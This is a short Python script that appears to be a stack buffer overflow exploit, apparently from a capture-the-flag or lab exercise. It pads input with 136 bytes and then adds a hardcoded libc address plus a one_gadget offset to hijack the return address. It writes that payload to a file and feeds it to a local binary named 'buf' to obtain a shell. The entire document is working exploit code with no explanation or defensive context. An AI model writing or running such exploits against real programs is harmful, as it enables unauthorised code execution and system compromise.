
from os import system
from struct import pack

tapis = 'A'*136
libc_base = 0x00007ffff7de8000
onegadget = pack("Q", libc_base + 0xe5756)
payload = tapis + onegadget
with open("tmp", "w") as f:
	f.write(payload)
system("./buf < tmp")
